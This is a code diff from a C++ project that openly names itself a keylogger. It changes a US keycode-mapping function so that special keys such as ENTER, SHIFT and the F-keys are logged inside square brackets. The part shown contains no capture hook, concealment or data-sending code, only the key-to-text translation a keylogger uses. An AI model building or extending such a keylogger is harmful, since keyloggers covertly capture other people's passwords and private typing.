@@ -6,54 +6,58 @@ namespace Keylogger {
 
 char shiftNum[] = ")!@#$%^&*(";
 
+std::string wrap(std::string s) {
+    return "[" + s + "]";
+}
+
 std::string KeycodeMapperUS::keycodeToStr(int keycode, bool modifierShift) {
     switch (keycode) {
     case VK_BACK:
-        return "BKSP";
+        return wrap("BKSP");
     case VK_TAB:
-        return "TAB";
+        return wrap("TAB");
     case VK_RETURN:
-        return "ENTER";
+        return wrap("ENTER");
     case VK_SHIFT:
-        return "SHIFT";
+        return wrap("SHIFT");
     case VK_CONTROL:
-        return "CTRL";
+        return wrap("CTRL");
     case VK_MENU:
-        return "ALT";
+        return wrap("ALT");
     case VK_PAUSE:
-        return "PAUSE";
+        return wrap("PAUSE");
     case VK_CAPITAL:
-        return "CAPSLOCK";
+        return wrap("CAPSLOCK");
     case VK_HANGUEL:
         break;
     case VK_HANJA:
         break;
     case VK_ESCAPE:
-        return "ESC";
+        return wrap("ESC");
     case VK_SPACE:
         return " ";
     case VK_PRIOR:
-        return "PAGE UP";
+        return wrap("PAGE UP");
     case VK_NEXT:
-        return "PAGE DN";
+        return wrap("PAGE DN");
     case VK_END:
-        return "END";
+        return wrap("END");
     case VK_HOME:
-        return "HOME";
+        return wrap("HOME");
     case VK_LEFT:
-        return "LEFT";
+        return wrap("LEFT");
     case VK_UP:
-        return "UP";
+        return wrap("UP");
     case VK_RIGHT:
-        return "RIGHT";
+        return wrap("RIGHT");
     case VK_DOWN:
-        return "DOWN";
+        return wrap("DOWN");
     case VK_SNAPSHOT:
-        return "PRINTSCREEN";
+        return wrap("PRINTSCREEN");
     case VK_INSERT:
-        return "INSERT";
+        return wrap("INSERT");
     case VK_DELETE:
-        return "DELETE";
+        return wrap("DELETE");
     case VK_HELP:
         break;
     case '0':
@@ -96,9 +100,9 @@ std::string KeycodeMapperUS::keycodeToStr(int keycode, bool modifierShift) {
         return std::string(1, modifierShift ? keycode : keycode - 'A' + 'a');
     case VK_LWIN:
     case VK_RWIN:
-        return "WIN";
+        return wrap("WIN");
     case VK_APPS:
-        return "MENU";
+        return wrap("MENU");
     case VK_NUMPAD0:
     case VK_NUMPAD1:
     case VK_NUMPAD2:
@@ -144,26 +148,26 @@ std::string KeycodeMapperUS::keycodeToStr(int keycode, bool modifierShift) {
     case VK_F22:
     case VK_F23:
     case VK_F24:
-        return "F" + std::to_string(keycode - VK_F1 + 1);
+        return wrap("F" + std::to_string(keycode - VK_F1 + 1));
     case VK_NUMLOCK:
-        return "NUMLOCK";
+        return wrap("NUMLOCK");
     case VK_SCROLL:
-        return "SCROLLLOCK";
+        return wrap("SCROLLLOCK");
     case VK_LSHIFT:
     case VK_RSHIFT:
-        return "SHIFT";
+        return wrap("SHIFT");
     case VK_LCONTROL:
     case VK_RCONTROL:
-        return "CTRL";
+        return wrap("CTRL");
     case VK_LMENU:
     case VK_RMENU:
-        return "ALT";
+        return wrap("ALT");
     case VK_VOLUME_MUTE:
-        return "VOL MUTE";
+        return wrap("VOL MUTE");
     case VK_VOLUME_DOWN:
-        return "VOL DOWN";
+        return wrap("VOL DOWN");
     case VK_VOLUME_UP:
-        return "VOL UP";
+        return wrap("VOL UP");
     case VK_OEM_1: // ;:
         return ";";
     case VK_OEM_PLUS:
@@ -189,7 +193,7 @@ std::string KeycodeMapperUS::keycodeToStr(int keycode, bool modifierShift) {
     default:
         break;
     }
-    return "{" + std::to_string(keycode) + "}";
+    return wrap("{" + std::to_string(keycode) + "}");
 }
 
 bool KeycodeMapperUS::isShiftConsumed(int keycode) {
